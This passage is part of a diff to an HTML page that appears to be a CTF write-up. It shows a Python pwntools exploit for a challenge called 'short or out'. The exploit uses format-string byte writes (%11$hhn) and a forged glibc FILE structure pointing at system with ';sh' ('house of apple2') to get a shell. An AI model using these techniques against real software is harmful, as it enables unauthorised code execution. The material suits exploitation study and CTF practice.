 sa(&quot;&gt; &quot;,bytes(f)[:0x78])
 sa(&quot;And then...&quot;,p32(0xDEADBEAF)*8)
 ia()
 </code></pre>
-<h3 id="short-or-out"><a href="#short-or-out" class="headerlink" title="short or out"></a>short or out</h3><p>house of apple2。</p>
-<pre><code class="python">#!/usr/bin/env python3
+<h3 id="short-or-out">short or out</h3>
+<p>house of apple2。</p>
+<pre><code class="language-python">#!/usr/bin/env python3
 
-&#39;&#39;&#39;
+'''
     author: Yoisaki_Kanade
     time: 2025-10-28 19:07:28
-&#39;&#39;&#39;
+'''
 from pwncli import *
 
 filename = &quot;pwn_patched&quot;
@@ -1745,7 +1767,7 @@ proc_name = &quot;&quot;
 elf = context.binary = ELF(filename)
 if libcname:
     libc = ELF(libcname)
-gs = &#39;&#39;&#39;
+gs = '''
 b main
 # b *(0x12FF +  0x555555554000)
 # b free
@@ -1753,10 +1775,10 @@ set debug-file-directory /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.17
 set directories /home/yoisaki_kanade/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibc-source_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31
 c
 c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
+'''
+context.log_level = 'debug'
+context.terminal =['tmux','splitw','-h']
+context.arch = 'amd64'
 
 def start():
     if args.GDB:
@@ -1770,12 +1792,12 @@ def start():
         client = docker.from_env()
         container = client.containers.get(container_id=container_id)
         processes_info = container.top()
-        titles = processes_info[&#39;Titles&#39;]
-        processes = [dict(zip(titles, proc)) for proc in processes_info[&#39;Processes&#39;]]
+        titles = processes_info['Titles']
+        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
         target_proc = []
         for proc in processes:
-            cmd = proc.get(&#39;CMD&#39;, &#39;&#39;)
-            exe_path = cmd.split()[0] if cmd else &#39;&#39;
+            cmd = proc.get('CMD', '')
+            exe_path = cmd.split()[0] if cmd else ''
             exe_name = path.basename(exe_path)
             if exe_name == proc_name:
                 target_proc.append(proc)
@@ -1785,10 +1807,10 @@ def start():
                 print(f&quot;&#123;i&#125; =&gt; &#123;v&#125;&quot;)
             idx = int(input(f&quot;Which one:&quot;))
         import tempfile
-        with tempfile.NamedTemporaryFile(prefix = &#39;cpwn-gdbscript-&#39;, delete=False, suffix = &#39;.gdb&#39;, mode = &#39;w&#39;) as tmp:
-            tmp.write(f&#39;shell rm &#123;tmp.name&#125;\n&#123;gs&#125;&#39;)
+        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
+            tmp.write(f'shell rm &#123;tmp.name&#125;\n&#123;gs&#125;')
         print(tmp.name)
-        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx][&#39;PID&#39;], &quot;-x&quot;, tmp.name])
+        run_in_new_terminal([&quot;sudo&quot;, &quot;gdb&quot;, &quot;-p&quot;, target_proc[idx]['PID'], &quot;-x&quot;, tmp.name])
         return p
     else:
         return process(elf.path)
@@ -1803,7 +1825,7 @@ s = lambda x : p.send(x)
 sl = lambda x : p.sendline(x)
 itob = lambda x : str(x).encode()
 su = lambda x : p.success(x)
-u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
+u64_ex = lambda x : u64(x.ljust(8,b'\0'))
 
 def send_(pay):
     sla(&quot;length: \n&quot;,itob(32))
@@ -1824,9 +1846,9 @@ def write(addr,data,cnt=8):
         return
     str_data = str(data &amp; 0xff).encode()
     if data != 0:
-        pay = (b&quot;%&quot; + str_data + b&quot;c%11$hhn&quot;).ljust(0x18,b&#39;\0&#39;) + p64(addr)
+        pay = (b&quot;%&quot; + str_data + b&quot;c%11$hhn&quot;).ljust(0x18,b'\0') + p64(addr)
     else:
-        pay = (b&quot;%11$hhn&quot;).ljust(0x18,b&#39;\0&#39;) + p64(addr)
+        pay = (b&quot;%11$hhn&quot;).ljust(0x18,b'\0') + p64(addr)
     send_(pay)
     write(addr+1,data&gt;&gt;8,cnt = cnt-1)
 
@@ -1842,9 +1864,9 @@ f._wide_data = bss_addr + 0x100
 f._IO_write_ptr = 0x2
 f._IO_write_base = 0x1
 f._mode = 0xffffffff
-super_write(bss_addr,(p32(0xfffff7f5)+ b&quot;;sh\x00&quot;).ljust(0x10,b&#39;\0&#39;) + bytes(f)[0x10:])
-C =  b&#39;\x00&#39;*0x68 + p64(libc_addr+ libc.sym[&quot;system&quot;])
-B = (b&#39;\x00&#39;*0x20+b&#39;\x01&#39;).ljust(0xe0,b&#39;\0&#39;) +p64(bss_addr + 0x200)
+super_write(bss_addr,(p32(0xfffff7f5)+ b&quot;;sh\x00&quot;).ljust(0x10,b'\0') + bytes(f)[0x10:])
+C =  b'\x00'*0x68 + p64(libc_addr+ libc.sym[&quot;system&quot;])
+B = (b'\x00'*0x20+b'\x01').ljust(0xe0,b'\0') +p64(bss_addr + 0x200)
 super_write(bss_addr+0x100,B)
 super_write(bss_addr+0x200,C)
 write(libc_addr + 0x1ed5a0,bss_addr)
